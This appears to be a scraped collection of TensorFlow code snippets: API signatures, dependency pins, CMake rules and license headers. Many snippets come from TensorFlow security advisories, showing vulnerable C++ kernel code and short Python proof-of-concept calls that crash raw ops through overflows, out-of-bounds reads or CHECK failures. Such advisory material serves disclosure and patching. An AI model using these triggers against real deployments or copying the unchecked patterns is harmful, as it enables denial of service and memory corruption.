DESCRIPTION: This C++ function calculates the total size of a tensor based on its element count and data type size. It was vulnerable to an integer overflow because the multiplication of 'count' and 'size' could exceed the maximum value of an `int64_t` or `int`, leading to incorrect size calculation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-038.md#_snippet_0

LANGUAGE: C++
CODE:
```
int64_t OpLevelCostEstimator::CalculateTensorSize(
    const OpInfo::TensorProperties& tensor, bool* found_unknown_shapes) {
  int64_t count = CalculateTensorElementCount(tensor, found_unknown_shapes);
  int size = DataTypeSize(BaseType(tensor.dtype()));
  VLOG(2) << "Count: " << count << " DataTypeSize: " << size;
  return count * size;
}
```

----------------------------------------

TITLE: Triggering UpperBound Segfault in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the segfault vulnerability in `tf.raw_ops.UpperBound`. It requires the TensorFlow library. Similar to LowerBound, the vulnerability is triggered by providing an empty tensor for the `sorted_inputs` parameter, here with a complex shape including a dimension of size 0. The expected output is a program crash (segfault).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-097.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

out_type = tf.int64
sorted_inputs = tf.constant([], shape=[2,2,0,0,0,0,0,2], dtype=tf.float32)
values = tf.constant(0.372660398, shape=[2,4], dtype=tf.float32)
tf.raw_ops.UpperBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)
```

----------------------------------------

TITLE: Getting Output Tensor Groups Count in Python
DESCRIPTION: Retrieves the number of entries in the output tensor groups list. This method returns the size of the output tensor groups array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_25

LANGUAGE: python
CODE:
```
OutputTensorGroupsLength()

```

----------------------------------------

TITLE: Defining nvidia-nvjitlink-cu12 Dependency
DESCRIPTION: Specifies the exact version (12.5.82) for the 'nvidia-nvjitlink-cu12' package and provides multiple SHA256 hashes. This requirement ensures the installation of a specific version of the NVJITLink library for CUDA 12, used for just-in-time compilation, and validates the package's integrity.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_10

LANGUAGE: Python Requirements
CODE:
```
nvidia-nvjitlink-cu12==12.5.82 \
    --hash=sha256:98103729cc5226e13ca319a10bbf9433bbbd44ef64fe72f45f067cacc14b8d27 \
    --hash=sha256:e782564d705ff0bf61ac3e1bf730166da66dd2fe9012f111ede5fc49b64ae697 \
    --hash=sha256:f9b37bc5c8cf7509665cb6ada5aaa0ce65618f2332b7d3e78e9790511f111212
```

----------------------------------------

TITLE: Packing Object with Builder (Python)
DESCRIPTION: Packs the current `ScoreCalibrationOptionsT` object's data into a FlatBuffers builder. This instance method is used for serializing the object into a flatbuffer representation. Requires a `builder` object, typically an instance of `flatbuffers.Builder`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptionsT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Comparing EmbeddingResult Equality Python
DESCRIPTION: Checks if the current `EmbeddingResult` object is equal to another object. It takes an `other` object of any type as input and returns `True` if the objects are considered equal, `False` otherwise. This method is typically used for value-based comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/EmbeddingResult.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Define INVERSE_LOGISTIC Constant in ScoreTransformationType (Python)
DESCRIPTION: Defines the integer value associated with the INVERSE_LOGISTIC score transformation type. This constant is a member of the `tflite_support.metadata_schema_py_generated.ScoreTransformationType` class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreTransformationType.md#_snippet_1

LANGUAGE: Python
CODE:
```
2
```

----------------------------------------

TITLE: Defining Equality Comparison Method __eq__ - Python
DESCRIPTION: This snippet presents the signature for the `__eq__` method of the `Category` class. This method is used to define how two `Category` objects (or a `Category` object and another object) are compared for equality, returning a boolean value indicating whether they are considered equal.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Category.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
 other: Any
) -> bool

```

----------------------------------------

TITLE: Checking TensorGroup Buffer Identifier | TensorFlow Lite Support Python
DESCRIPTION: Class method to check if a buffer contains the identifier for a `TensorGroup` FlatBuffers object. It can optionally check for a size-prefixed buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroup.md#_snippet_4

LANGUAGE: python
CODE:
```
@classmethod
TensorGroupBufferHasIdentifier(
 buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Starting Tensor Names Vector with FlatBuffer Builder Python
DESCRIPTION: This function prepares a FlatBuffer vector to store tensor names within a TensorGroup metadata structure. It requires a FlatBuffer `builder` object and the expected number of elements (`numElems`) for the vector as input. It is part of the TensorFlow Lite Support metadata schema generation utility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroupStartTensorNamesVector.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorGroupStartTensorNamesVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Accessing TensorFlow Tensor as Matrix in C++
DESCRIPTION: This C++ snippet from the TensorFlow kernel for `SparseCountSparseOutput` attempts to access the `indices` input tensor as a matrix of `int64`. The vulnerability occurs here because the code assumes `indices` has rank 2 (is a matrix) without validating the input tensor's actual rank, leading to a crash if a tensor of a different rank is provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-019.md#_snippet_0

LANGUAGE: C++
CODE:
```
const auto indices_values = indices.matrix<int64>();
```

----------------------------------------

TITLE: QuantizeAndDequantizePerChannelGradientImpl Compute Method (C++)
DESCRIPTION: This C++ snippet shows the `Compute` method signature and relevant lines from the internal `QuantizeAndDequantizePerChannelGradientImpl` struct. It highlights the code paths where `vec<T>()` is called on `input_min_tensor` and `input_max_tensor`. This is where the vulnerability is triggered, as `vec<T>()` requires a rank of 1 but receives tensors with a higher rank due to lack of validation in the caller, resulting in a `CHECK` failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-031.md#_snippet_1

LANGUAGE: C++
CODE:
```
template <typename Device, typename T>
struct QuantizeAndDequantizePerChannelGradientImpl {
  static void Compute(const Device& d,
                      typename TTypes<T, 3>::ConstTensor gradient,
                      typename TTypes<T, 3>::ConstTensor input,
                      const Tensor* input_min_tensor,
                      const Tensor* input_max_tensor,
                      typename TTypes<T, 3>::Tensor input_backprop,
                      typename TTypes<T>::Flat input_min_backprop,
                      typename TTypes<T>::Flat input_max_backprop) {
    ...
    auto input_min = input_min_tensor->vec<T>();
    auto input_max = input_max_tensor->vec<T>();
    ...
}
```

----------------------------------------

TITLE: Accessing GPU Options in TensorFlow XLA Config (C++)
DESCRIPTION: This C++ snippet attempts to retrieve the visible device list from the GPU options within a TensorFlow config proto. It is the line identified as causing a null pointer dereference (TFSA-2022-059) when the `flr->config_proto()` object is unexpectedly null, which occurs in default configurations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-059.md#_snippet_0

LANGUAGE: C++
CODE:
```
  string allowed_gpus =
      flr->config_proto()->gpu_options().visible_device_list();
```

----------------------------------------

TITLE: Triggering RaggedCross Heap OOB Read Vulnerability Python
DESCRIPTION: This Python code demonstrates how to trigger the heap out-of-bounds read vulnerability in `tf.raw_ops.RaggedCross` by providing specific invalid inputs. It shows a minimal setup with empty/malformed tensors and parameters that exploit the missing validation in the operator's implementation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-021.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

ragged_values = []
ragged_row_splits = []
sparse_indices = []
sparse_values = []
sparse_shape = []

dense_inputs_elem = tf.constant([], shape=[92, 0], dtype=tf.int64)
dense_inputs = [dense_inputs_elem]

input_order = "R"
hashed_output = False
num_buckets = 0
hash_key = 0

tf.raw_ops.RaggedCross(ragged_values=ragged_values,
    ragged_row_splits=ragged_row_splits,
    sparse_indices=sparse_indices,
    sparse_values=sparse_values,
    sparse_shape=sparse_shape,
    dense_inputs=dense_inputs,
    input_order=input_order,
    hashed_output=hashed_output,
    num_buckets=num_buckets,
    hash_key=hash_key,
    out_values_type=tf.int64,
    out_row_splits_type=tf.int64)
```

----------------------------------------

TITLE: Triggering QuantizedReshape Overflow (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a heap buffer overflow vulnerability in vulnerable versions of TensorFlow's `QuantizedReshape` operation. It creates empty tensors for `tensor`, `shape`, `input_min`, and `input_max` and passes them to the `tf.raw_ops.QuantizedReshape` function. The vulnerability occurs because the C++ kernel expects scalar inputs for `input_min` and `input_max` and attempts to access the first element (index 0) of these empty tensors, resulting in an out-of-bounds read and overflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-026.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tensor = tf.constant([], dtype=tf.qint32)
shape = tf.constant([], dtype=tf.int32)
input_min = tf.constant([], dtype=tf.float32)
input_max = tf.constant([], dtype=tf.float32)

tf.raw_ops.QuantizedReshape(tensor=tensor, shape=shape, input_min=input_min, input_max=input_max)
```

----------------------------------------

TITLE: Demonstrating EmptyTensorList Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the TFSA-2022-122 vulnerability. It invokes the `tf.raw_ops.EmptyTensorList` operation with an `element_shape` tensor that has more than one dimension (specifically, shape=[1, 0]), which caused a CHECK fail and potential denial of service in affected TensorFlow versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-122.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.EmptyTensorList(element_shape=tf.ones(dtype=tf.int32, shape=[1, 0]), max_num_elements=tf.constant(1),element_dtype=tf.int32)
```

----------------------------------------

TITLE: Triggering Crash with NonMaxSuppressionV5 in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the TFSA-2021-143 vulnerability in the TensorFlow `tf.raw_ops.NonMaxSuppressionV5` operation. By setting the `max_output_size` parameter to -1, an attacker can cause a crash due to an integer conversion issue in the underlying C++ kernel when resizing an internal vector, leading to denial of service. It requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-143.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.NonMaxSuppressionV5(
  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],
  scores=[1.0,2.0,3.0],
  max_output_size=-1,
  iou_threshold=0.5,
  score_threshold=0.5,
  soft_nms_sigma=1.0,
  pad_to_max_output_size=True)
```

----------------------------------------

TITLE: Defining Apache 2.0 License Header Python
DESCRIPTION: This code block contains the standard Apache License, Version 2.0 header. It specifies the terms under which the source code is provided and used.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/jit_compile.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Set Sample Rate in Audio Properties Builder (Python)
DESCRIPTION: This Python function is used within the TensorFlow Lite Support metadata schema generation process to set the `sampleRate` field for an `AudioProperties` FlatBuffer object being built. It requires the FlatBuffer builder instance and the integer `sampleRate` value to be added. This function is typically called internally during metadata creation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioPropertiesAddSampleRate.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.AudioPropertiesAddSampleRate(
    builder, sampleRate
)
```

----------------------------------------

TITLE: Apache License Header Python
DESCRIPTION: Contains the standard Apache License, Version 2.0 header for the file. It specifies the terms under which the code is licensed and distributed. This block provides important legal information regarding the use and modification of the code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Defining packaging Dependency
DESCRIPTION: Specifies the exact version (23.2) for the 'packaging' package and provides multiple SHA256 hashes. This requirement ensures the installation of a specific version of the core utilities for Python package management and validation, and validates the package's integrity.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_12

LANGUAGE: Python Requirements
CODE:
```
packaging==23.2 \
    --hash=sha256:048fb0e9405036518eaaf48a55953c750c11e1a1b68e0dd1a9d62ed0c092cfc5 \
    --hash=sha256:8c491190033a9af7e1d931d0b5dacc2ef47509b34dd0de67ed209b5203fc88c7
```

----------------------------------------

TITLE: Lowering Resize Operation to TOSA (MLIR)
DESCRIPTION: This function lowers a resize operation to the TOSA dialect. It calculates strides and offsets based on input/output dimensions, alignment, and half-pixel centering modes. It uses the TOSA RESIZE operation and includes handling for different data types (float vs. quantized), implementing bilinear interpolation steps for the latter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_17

LANGUAGE: MLIR/TOSA
CODE:
```
Value lower_resize_op(Value %images, Value %size, shape output_shape, dtype output_dtype, mode_t mode)
{
    int32 input_height  = %input.shape[1]
    int32 input_width   = %input.shape[2]
    int32 output_height = %output.shape[1]
    int32 output_width  = %output.shape[2]

    float64 in_center_h  = static_cast<float64>(input_height - 1) / 2.0
    float64 in_center_w  = static_cast<float64>(input_width - 1) / 2.0
    float64 out_center_h = static_cast<float64>(output_height - 1) / 2.0
    float64 out_center_w = static_cast<float64>(output_width - 1) / 2.0

    float64 fp_stride_y, fp_stride_x
    if (align_corner && output_height > 1)
        fp_stride_y = static_cast<float64>(input_height - 1) / static_cast<float64>(output_height - 1)
    else
        fp_stride_y = static_cast<float64>(input_height) / static_cast<float64>(output_height)
    if (align_corner && output_width > 1)
        fp_stride_x = static_cast<float64>(input_width - 1) / static_cast<float64>(output_width - 1)
    else
        fp_stride_x = static_cast<float64>(input_width) / static_cast<float64>(output_width)

    float64 fp_offset_y = fp_offset_y = 0.0f
    if (half_pixel_centers) {
        fp_offset_y = fp_stride_y * 0.5f - 0.5f
        fp_offset_x = fp_stride_x * 0.5f - 0.5f
    }

    if (dtype == float)
        %op1_resize_in = tosa.RESIZE(%input) {stride={fp_stride_y, fp_stride_x}, offset={fp_offset_y, fp_offset_x}, shift=0, resize_mode=mode}
    else {
        int32 shift = 10
        float64 unit = static_cast<float64>(1 << shift)
        int32 stride_y = fp_stride_y * unit
        int32 stride_x = fp_stride_x * unit
        int32 offset_y = fp_offset_y * unit
        int32 offset_x = fp_offset_x * unit

        %op1_resize_in = tosa.RESIZE(%input) {stride={stride_y, stride_x}, offset={offset_y, offset_x}, shift=shift, resize_mode=mode}

        if (mode == "BILINEAR") {
            %const_zero = tosa.CONST() {value={0}}
            %const_twenty = tosa.CONST() {value={20}}
            %op2_ge_op1 = tosa.GREATER_EQUAL(%op1_resize_in, %const_zero)
            %op3_abs_op1 = tosa.ABS(%op1_resize_in)
            %op4_rshift_op3 = tosa.ARITHMETIC_RIGHT_SHIFT(%op3_abs_op1, %const_twenty)
            %op5_negate_op4 = tosa.NEGATE(%op4_rshift_op3)
            %op6_select_op2_op4_op5 = tosa.SELECT(%op2_ge_op1, %op4_rshift_op3, %op5_negate_op4)
            %op7_cast_op6 = tosa.CAST(%op6_select_op2_op4_op5) // i32/i48->%output.dtype
        }
    }
}
```

----------------------------------------

TITLE: Setting Core Library List (CMake)
DESCRIPTION: Defines a variable `LIBS` by consolidating previously retrieved library lists (`dialect_libs`, `conversion_libs`, `extension_libs`) along with specific libraries like `MLIROptLib` and various MLIR HLO passes and transforms. This combined list is intended for linking to the executable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tools/mlir-hlo-opt/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
set(LIBS
        ${dialect_libs}
        ${conversion_libs}
        ${extension_libs}
        MLIROptLib

        AllMhloPasses
        DeallocationPasses
        MLIRBufferTransforms
        MLIRHLOGPUTransforms
        MhloRegisterDialects
        )
```

----------------------------------------

TITLE: Installing CMake Library Target
DESCRIPTION: Configures the installation rules for the `farmhash` library target, specifying destinations for the library archive, shared library, and public headers when the `TFLITE_ENABLE_INSTALL` option is enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/farmhash/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
if(TFLITE_ENABLE_INSTALL)
  install(
    TARGETS farmhash
    EXPORT tensorflow-liteTargets
    LIBRARY DESTINATION ${CMAKE_INSTALL_LIBDIR}
    ARCHIVE DESTINATION ${CMAKE_INSTALL_LIBDIR}
    PUBLIC_HEADER DESTINATION ${CMAKE_INSTALL_INCLUDEDIR}
  )
endif()
```

----------------------------------------

TITLE: Linking Libraries for MhloRegisterDialects
DESCRIPTION: This command links the `MhloRegisterDialects` library target publicly to the `MhloDialect` library, ensuring it can register the MHLO dialect.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_10

LANGUAGE: cmake
CODE:
```
target_link_libraries(MhloRegisterDialects
  PUBLIC
  MhloDialect
)
```

----------------------------------------

TITLE: Generating MLIR Pass Declarations (CMake)
DESCRIPTION: Invokes the `mlir_tablegen` utility to generate C++ header files containing MLIR pass declarations from TableGen definitions. The output `passes.h.inc` is intended to be included in C++ source files to declare the passes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/stablehlo_ext/transforms/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
mlir_tablegen(passes.h.inc -gen-pass-decls)
```

----------------------------------------

TITLE: Adding Public MLIR TableGen Build Target - CMake
DESCRIPTION: Creates a CMake build target named `LMHLOTransformsPassIncGen` that depends on the output of the preceding `mlir_tablegen` command. This target ensures the header generation step is run and makes its output available to other parts of the build system.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/transforms/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_public_tablegen_target(LMHLOTransformsPassIncGen)
```

----------------------------------------

TITLE: Demonstrating TensorFlow GetSessionTensor DoS (Python)
DESCRIPTION: This Python snippet demonstrates a denial-of-service vulnerability in `tf.raw_ops.GetSessionTensor` by providing a non-scalar handle. The missing validation on the handle's shape leads to a CHECK-failure. This requires the TensorFlow library as a dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-064.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

handle = tf.constant("[]", shape=[0], dtype=tf.string)
tf.raw_ops.GetSessionTensor(handle=handle)
```

----------------------------------------

TITLE: Define LOG Constant in ScoreTransformationType (Python)
DESCRIPTION: Defines the integer value associated with the LOG score transformation type. This constant is a member of the `tflite_support.metadata_schema_py_generated.ScoreTransformationType` class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreTransformationType.md#_snippet_2

LANGUAGE: Python
CODE:
```
1
```

----------------------------------------

TITLE: Copy Model Submission to Test Data - Shell
DESCRIPTION: Copies your TFLite model submission file from its location to the OVIC testdata directory. Replace `/path/to/my_model.lite` with the source path of your model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_7

LANGUAGE: sh
CODE:
```
cp /path/to/my_model.lite tensorflow/lite/java/ovic/src/testdata/
```

----------------------------------------

TITLE: Triggering ParameterizedTruncatedNormal Vulnerability Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the null pointer binding vulnerability in `tf.raw_ops.ParameterizedTruncatedNormal`. It initializes necessary parameters and calls the operation with an empty `shape` tensor, which bypasses internal validation in affected versions and leads to undefined behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-055.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

shape = tf.constant([], shape=[0], dtype=tf.int32)
means = tf.constant((1), dtype=tf.float32)
stdevs = tf.constant((1), dtype=tf.float32)
minvals = tf.constant((1), dtype=tf.float32)
maxvals = tf.constant((1), dtype=tf.float32)

tf.raw_ops.ParameterizedTruncatedNormal(
  shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals)
```

----------------------------------------

TITLE: Internal TensorSummaryV2 Metadata Access (C++)
DESCRIPTION: This C++ snippet from the TensorFlow kernel implementation for `TensorSummaryV2` illustrates the internal logic that processes the `serialized_summary_metadata` input. It shows the assumption that this input is a scalar tensor (`scalar<tstring>()`) and how its value is used (`ParseFromTString`). The lack of explicit validation of the tensor's shape before this access is the vulnerability point, leading to a crash if a non-scalar tensor is provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-061.md#_snippet_1

LANGUAGE: c++
CODE:
```
    const Tensor& serialized_summary_metadata_tensor = c->input(2);
    // ...
    ParseFromTString(serialized_summary_metadata_tensor.scalar<tstring>()(),
                     v->mutable_metadata());
```

----------------------------------------

TITLE: Vulnerable StringNGrams Kernel Implementation C++
DESCRIPTION: This C++ code snippet from the TensorFlow StringNGrams kernel highlights the vulnerable section. It shows the loop constructing ngrams and specifically points out the line (`ngram->append(data[data_start_index + num_tokens - 1]);`) that can cause a heap buffer overflow. If crafted inputs lead to `num_tokens == 0` and `data_start_index == 0`, this line attempts to access `data[-1]`, resulting in an out-of-bounds read.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-029.md#_snippet_1

LANGUAGE: c++
CODE:
```
for (int ngram_index = 0; ngram_index < num_ngrams; ++ngram_index) {
  int pad_width = get_pad_width(ngram_width);
  int left_padding = std::max(0, pad_width - ngram_index);
  int right_padding = std::max(0, pad_width - (num_ngrams - (ngram_index + 1)));
  int num_tokens = ngram_width - (left_padding + right_padding);
  int data_start_index = left_padding > 0 ? 0 : ngram_index - pad_width;
  ...
  tstring* ngram = &output[ngram_index];
  ngram->reserve(ngram_size);
  for (int n = 0; n < left_padding; ++n) {
    ngram->append(left_pad_);
    ngram->append(separator_);
  }
  for (int n = 0; n < num_tokens - 1; ++n) {
    ngram->append(data[data_start_index + n]);
    ngram->append(separator_);
  }
  ngram->append(data[data_start_index + num_tokens - 1]); // <<<
  for (int n = 0; n < right_padding; ++n) {
    ngram->append(separator_);
    ngram->append(right_pad_);
  }
  ...
}
```

----------------------------------------

TITLE: Demonstrating TensorFlow TensorListScatter Crash (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the vulnerability (CVE-2022-35991) in TensorFlow's `tf.raw_ops.TensorListScatter`. It shows that providing non-scalar tensors for the `element_shape` argument can cause a crash, specifically when operating in eager mode.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-170.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
element_shape=arg_2, name=arg_3)
```

----------------------------------------

TITLE: SparseCross Value Access Logic (C++)
DESCRIPTION: This C++ code snippet from `tensorflow/core/kernels/sparse_cross_op.cc` shows the logic used to access values within the `SparseCross` operation. It checks if the `values_` tensor has a `DT_STRING` data type. If it does, it attempts to access the data as `tstring`. Otherwise, it accesses it as `int64`. This conditional logic is flawed because it assumes `DT_STRING` implies `tstring` data, while the vulnerability exploits a scenario where `DT_STRING` is specified but the underlying data might be interpreted as `int64`, leading to the type confusion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-008.md#_snippet_2

LANGUAGE: C++
CODE:
```
  if (DT_STRING == values_.dtype())
      return Fingerprint64(values_.vec<tstring>().data()[start + n]);
  return values_.vec<int64>().data()[start + n];
```

----------------------------------------

TITLE: Triggering RaggedTensorToTensor vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a heap buffer overflow in `tf.raw_ops.RaggedTensorToTensor` by crafting specific input tensors, including shape, values, default value, and row partitions. The vulnerability is triggered by providing inputs where the `parent_output_index` derived internally is shorter than `row_split`, leading to an out-of-bounds access.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-048.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

shape = tf.constant([10, 10], shape=[2], dtype=tf.int64)
values = tf.constant(0, shape=[1], dtype=tf.int64)
default_value = tf.constant(0, dtype=tf.int64)
l = [849, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
row = tf.constant(l, shape=[5, 43], dtype=tf.int64)
rows = [row]
types = ['ROW_SPLITS']

tf.raw_ops.RaggedTensorToTensor(
    shape=shape, values=values, default_value=default_value,
    row_partition_tensors=rows, row_partition_types=types)
```

----------------------------------------

TITLE: Demonstrating TensorFlow Unbatch Vulnerability (Python)
DESCRIPTION: This Python code snippet demonstrates how providing a nonscalar tensor (specifically `arg_2` which is a `tf.int64` tensor of shape (3, 3, 1)) as the `id` argument to `tf.raw_ops.Unbatch` can trigger a `CHECK` fail, exploiting the CVE-2022-36002 vulnerability. It initializes input tensors (`batched_tensor`, `batch_index`, `id`) and other parameters (`timeout_micros`, `container`, `shared_name`) before calling the `Unbatch` operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-134.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
arg_0=tf.constant(value=np.random.random(size=(3, 3, 1)), dtype=tf.float64)
arg_1=tf.constant(value=np.random.randint(0,100,size=(3, 3, 1)), dtype=tf.int64)
arg_2=tf.constant(value=np.random.randint(0,100,size=(3, 3,  1)), dtype=tf.int64)
arg_3=47
arg_4=''
arg_5=''
tf.raw_ops.Unbatch(batched_tensor=arg_0, batch_index=arg_1, id=arg_2, 
                   timeout_micros=arg_3, container=arg_4, shared_name=arg_5)
```

----------------------------------------

TITLE: Accessing TensorFlow MatrixSetDiag Index Without Validation (C++)
DESCRIPTION: This C++ snippet shows the problematic code section within the TensorFlow kernel (`matrix_diag_op.cc`) responsible for the vulnerability. It attempts to access the first element of the `diag_index` tensor (corresponding to the user-supplied `k` parameter) using `diag_index.flat<int32>()(0)` without checking if the tensor is empty, which causes a null pointer dereference if `k` is empty.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-132.md#_snippet_1

LANGUAGE: cpp
CODE:
```
  auto& diag_index = context->input(1);
  ...
